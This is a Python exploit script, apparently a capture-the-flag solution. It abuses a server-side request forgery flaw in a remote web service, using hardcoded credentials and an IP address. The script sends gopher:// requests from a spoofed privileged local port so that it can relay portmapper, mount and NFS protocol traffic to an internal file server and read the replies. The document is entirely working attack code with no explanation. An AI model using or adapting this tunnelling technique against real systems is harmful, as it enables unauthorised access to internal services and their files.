from pwn import *
import requests
import base64
import urllib.parse
import re
from random import randint

remoteurl = 'http://54.250.88.37:24765/'
creds  = 'ctf:04ca9aa011a34a9c'

def sendgopher(sport=2049,sdata=b''):
    headers = {"Authorization": "Basic "+base64.b64encode(creds.encode('utf-8')).decode('utf-8')}
    postd = {"url": "gopher://nfs.server:"+str(sport)+"/_"+(urllib.parse.quote(sdata)),"CURLOPT_LOCALPORT":str(randint(500, 1023))}
    x=requests.post(remoteurl, headers=headers, data=postd)
    if ('Your Metamon</a>' in x.text):
        aa = re.findall(r'<a target="_blank" href="(.*?)">',x.text)
        try:
            print(remoteurl+aa[0])
            xx = requests.get(remoteurl+aa[0],stream=True)
            return (xx.raw.read())
        except Exception as e:
            print(str(e))
    else:
        print(x.text)

def runproxyserver(port):
    s = server(port)
    cc = s.next_connection()
    x=cc.recv(1024)
    dogopher=(sendgopher(sport=port,sdata=x+b'\r\n'))
    print(dogopher)
    cc.send(dogopher)
    s.close()

## port mapper
runproxyserver(111)

## mount
runproxyserver(41683)

## nfs
runproxyserver(2049)